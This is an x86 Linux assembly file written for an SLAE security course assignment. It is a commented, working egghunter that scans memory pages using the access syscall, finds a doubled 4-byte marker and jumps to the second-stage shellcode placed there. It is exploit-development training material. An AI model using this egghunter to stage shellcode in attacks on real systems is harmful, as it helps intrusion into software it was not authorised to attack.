; SLAE - SecurityTube Linux Assembly Expert
; Assignment #3: Egghunter (Linux/x86)


global _start

section .text
_start:

    ; reset registers
    xor eax, eax
    xor ecx, ecx
    xor edx, edx

    mov esi, 0x90509050     ; 4 byte EGG


next_mempage:
    ; next memory page starts at current position + 4096 bytes
    or dx, 0xfff            ; EDX=EDX+4095

next_byte:
    inc edx                 ; EDX=EDX+1    i.e.= +4096 (start of memory page)
    xor eax, eax
    mov al, 0x21            ; sys_access call
    lea ebx, [edx+8]        ; load address of next 8 bytes
    int 0x80
    cmp al, 0xf2            ; check if the value returned by the access call is EFAULT
    je next_mempage          ; if EFAULT, we can move to next memory page


    ; if no EFAULT occured, search egg
    cmp [edx], esi
    jnz next_byte

    ; if the first 4 bytes corresponds to the egg, test the following 4 bytes (egg is repeated twice)
    cmp [edx+4], esi
    jnz next_byte

    ; if the egg matches again, we have found our second stage shellcode, and we can jump to it
    jmp edx
